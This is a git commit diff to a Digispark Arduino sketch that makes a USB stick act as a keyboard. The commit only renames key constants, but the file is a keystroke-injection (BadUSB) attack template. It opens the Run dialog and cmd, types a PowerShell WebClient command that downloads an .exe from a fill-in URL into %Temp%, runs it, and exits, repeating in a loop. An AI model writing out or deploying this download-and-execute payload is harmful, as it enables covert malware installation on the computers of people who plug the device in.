85e6073fc03b6c1cdb0d75e915e9561097c9fec4
Slizarenlook <43479126+Slizarenlook@users.noreply.github.com>
2020-07-10 08:49:21 +0000

    Update digispark_downloadboard.ino

--- digispark_downloadboard.ino
+++ digispark_downloadboard.ino
@@ -1,6 +1,8 @@
 #include "DigiKeyboard.h"
-#define MOD_SHIFT_LEFT      (1<<1)
-#define MOD_ALT_LEFT        (1<<2)
+// all defines were found in https://www.usb.org/sites/default/files/documents/hut1_12v2.pdf page 54 in "Usage ID (Dec)"
+#define SHIFT     225  
+#define ALT       226    
+#define  ENTER    88  
 void setup() {
   // put your setup code here, to run once:
 
@@ -11,24 +13,24 @@ void loop() {
 delay(1000);
 DigiKeyboard.print("");
 delay(1000);
-DigiKeyboard.sendKeyStroke(MOD_SHIFT_LEFT, MOD_ALT_LEFT);
+DigiKeyboard.sendKeyStroke(SHIFT, ALT);
 delay(1000);
 DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
 delay(1000);
 DigiKeyboard.print("cmd");
 delay(500);
-DigiKeyboard.sendKeyStroke(KEY_ENTER);
+DigiKeyboard.sendKeyStroke(ENTER);
 delay(500);
 DigiKeyboard.print("powershell (new-object System.Net.WebClient).DownloadFile('link on your file','%Temp%/yourfile.exe')");
 delay(500);
-DigiKeyboard.sendKeyStroke(KEY_ENTER);
+DigiKeyboard.sendKeyStroke(ENTER);
 delay(500);
 DigiKeyboard.print("%Temp%/yourfile.exe");
 delay(500);
-DigiKeyboard.sendKeyStroke(KEY_ENTER);
+DigiKeyboard.sendKeyStroke(ENTER);
 delay(500);
 DigiKeyboard.print("exit");
 delay(500);
-DigiKeyboard.sendKeyStroke(KEY_ENTER);
+DigiKeyboard.sendKeyStroke(ENTER);
 }
 
